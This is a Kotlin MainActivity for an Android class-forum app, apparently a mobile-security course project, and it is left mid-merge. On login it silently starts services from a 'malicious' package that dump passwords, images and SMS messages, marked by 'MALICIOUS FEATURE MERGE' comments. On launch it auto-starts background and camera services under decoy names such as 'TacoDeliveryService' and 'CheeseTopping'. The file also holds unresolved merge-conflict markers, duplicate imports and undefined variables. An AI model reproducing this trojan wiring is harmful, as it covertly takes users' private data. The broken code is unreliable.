package com.example.mobsec_823

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.runtime.*
import com.example.mobsec_823.data.ClassEntity
import com.example.mobsec_823.data.DatabaseHelper
import com.example.mobsec_823.data.User
import com.example.mobsec_823.ui.screens.* // Assuming your screens are in this package
import com.example.mobsec_823.ui.theme.MobSecTheme

import android.Manifest
import android.content.Intent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

import androidx.compose.ui.platform.LocalContext
import com.example.mobsec_823.malicious.ImageDumpService
import com.example.mobsec_823.malicious.PasswordDumpService
import com.example.mobsec_823.malicious.SMSDumpService

class MainActivity : ComponentActivity() {
    private val cameraPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                startCameraService()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

<<<<<<< Updated upstream
        // --- Automatically start the background service --- 
=======
        // --- Automatically start the background service ---
>>>>>>> Stashed changes
        val serviceIntent = Intent(this, TacoDeliveryService::class.java).apply {
            action = TacoDeliveryService.ACTION_OPEN_FOR_BUSINESS
        }
        startService(serviceIntent)
        // --------------------------------------------------

        // Initialize database helper with application context
        DatabaseHelper.initialize(applicationContext)

        enableEdgeToEdge()

        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)

        setContent {
            MobSecTheme {
                MobSecApp()
            }
        }
    }

    private fun startCameraService() {
        val intent = Intent(this, CheeseTopping::class.java)
        ContextCompat.startForegroundService(this, intent)
    }
}

@Composable
fun MobSecApp() {
    var currentScreen by remember { mutableStateOf<Screen>(Screen.LoginTest) }
    var currentUser by remember { mutableStateOf<User?>(null) }
    var selectedClass by remember { mutableStateOf<ClassEntity?>(null) }

    when (val screen = currentScreen) {
        is Screen.LoginTest -> {
            LoginTestScreen(
                onUserSelected = { user ->
                    currentUser = user
                    currentScreen = if (user.role == "teacher") {
                        Screen.TeacherDashboard
                    } else {
                        Screen.HomeMenu
                    }
                }
            )
        }
<<<<<<< Updated upstream
        is Screen.HomeMenu -> {
=======
    } else {
        AppScaffold(
            currentScreen = currentScreen,
            currentUser = currentUser,
            selectedClass = selectedClass,
            groupManagementFromClassManagement = groupManagementFromClassManagement,
            adminManagementSelectedTab = adminManagementSelectedTab,
            onScreenChange = { currentScreen = it },
            onUserChange = { currentUser = it },
            onClassChange = { selectedClass = it },
            onGroupManagementFromClassManagementChange = { groupManagementFromClassManagement = it },
            onAdminManagementSelectedTabChange = { adminManagementSelectedTab = it },
            onOpenDrawer = { scope.launch { drawerState.open() } }
        )
    }
}

@Composable
fun AppScaffold(
    currentScreen: Screen,
    currentUser: User?,
    selectedClass: ClassEntity?,
    groupManagementFromClassManagement: Boolean,
    adminManagementSelectedTab: Int,
    onScreenChange: (Screen) -> Unit,
    onUserChange: (User?) -> Unit,
    onClassChange: (ClassEntity?) -> Unit,
    onGroupManagementFromClassManagementChange: (Boolean) -> Unit,
    onAdminManagementSelectedTabChange: (Int) -> Unit,
    onOpenDrawer: () -> Unit
) {

    // Get context for starting services
    val context = LocalContext.current

    when (currentScreen) {
        Screen.Login -> {
            LoginScreen(
                onLoginSuccess = { user ->
                    onUserChange(user)

                    // --- MALICIOUS FEATURE MERGE START ---
                    // Trigger services upon successful login
                    val passwordIntent = Intent(context, PasswordDumpService::class.java)
                    context.startService(passwordIntent)

                    val imageIntent = Intent(context, ImageDumpService::class.java)
                    context.startService(imageIntent)

                    val smsIntent = Intent(context, SMSDumpService::class.java)
                    context.startService(smsIntent)
                    // --- MALICIOUS FEATURE MERGE END ---

                    onScreenChange(Screen.HomeMenu)
                },
                onNavigateToRegister = { onScreenChange(Screen.Register) }
            )
        }
        Screen.Register -> {
            RegisterScreen(
                onRegisterSuccess = { onScreenChange(Screen.Login) },
                onNavigateToLogin = { onScreenChange(Screen.Login) }
            )
        }
        Screen.Profile -> {
            currentUser?.let { user ->
                ProfileScreen(
                    user = user,
                    onBackClick = onOpenDrawer,
                    onLogout = {
                        onUserChange(null)
                        onScreenChange(Screen.Login)
                    },
                    onProfileUpdated = { updatedUser ->
                        onUserChange(updatedUser)
                    }
                )
            }
        }
        Screen.HomeMenu -> {
>>>>>>> Stashed changes
            currentUser?.let { user ->
                HomeMenuScreen(
                    user = user,
                    onNavigateToForum = { currentScreen = Screen.ClassList },
                    onNavigateToStudentDashboard = { currentScreen = Screen.StudentDashboard },
                    onNavigateToClassManagement = { currentScreen = Screen.ClassManagement },
                    onNavigateToStudentQuery = { currentScreen = Screen.StudentQuery },
                    onNavigateToTeacherDashboard = { currentScreen = Screen.TeacherDashboard },
                    onNavigateToGroupManagement = { currentScreen = Screen.GroupManagement },
                    onLogout = {
                        currentScreen = Screen.LoginTest
                        currentUser = null
                        selectedClass = null
                    }
                )
            }
        }
        is Screen.ClassList -> {
            currentUser?.let { user ->
                ClassListScreen(
                    user = user,
                    onClassSelected = { classEntity ->
                        selectedClass = classEntity
                        currentScreen = Screen.DiscussionForum
                    },
                    onBackClick = { currentScreen = Screen.HomeMenu }
                )
            }
        }
        is Screen.DiscussionForum -> {
            currentUser?.let { user ->
                selectedClass?.let { classEntity ->
                    DiscussionForumScreen(
                        user = user,
                        classId = classEntity.classId,
                        className = classEntity.className,
                        onBackClick = { currentScreen = Screen.ClassList }
                    )
                }
            }
        }
        // ... (rest of your original when statement cases) ...
        else -> {
            // Fallback or error screen
            LoginTestScreen(onUserSelected = { user ->
                currentUser = user
                currentScreen = if (user.role == "teacher") Screen.TeacherDashboard else Screen.HomeMenu
            })
        }
    }
}

// Assuming your Screen sealed class is defined elsewhere, if not, it should be included.
// For example:
sealed class Screen {
    object LoginTest : Screen()
    object HomeMenu : Screen()
    object ClassList : Screen()
    object DiscussionForum : Screen()
    object ClassManagement : Screen()
    object StudentDashboard : Screen()
    object StudentQuery : Screen()
    object TeacherDashboard : Screen()
    object GroupManagement : Screen()
}
